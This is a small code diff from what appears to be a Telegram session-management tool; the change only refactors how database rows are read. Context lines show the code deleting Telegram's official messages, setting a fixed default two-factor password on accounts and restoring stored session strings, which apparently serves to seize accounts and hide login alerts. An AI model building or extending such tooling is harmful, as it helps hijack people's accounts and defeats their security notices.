@@ -841,7 +841,7 @@ async def _apply_default_2fa(phone: str) -> dict:
     try:
         await delete_telegram_official_messages(client)
         row = await database.get_session_by_phone(phone)
-        current = (row or {}).get("two_fa") or None
+        current = database.row_get(row, "two_fa") or None
         if current == DEFAULT_2FA_PASSWORD:
             await database.update_session_two_fa(phone, DEFAULT_2FA_PASSWORD)
             await database.mark_session_secured(phone)
@@ -1124,7 +1124,7 @@ async def recover_session(phone: str) -> dict:
     try:
         client = await get_active_client(phone)
         if not client:
-            ss = (row.get("session_string") or "").strip()
+            ss = (database.row_get(row, "session_string") or "").strip()
             client = make_telegram_client(ss if ss else None)
             await client.connect()
 
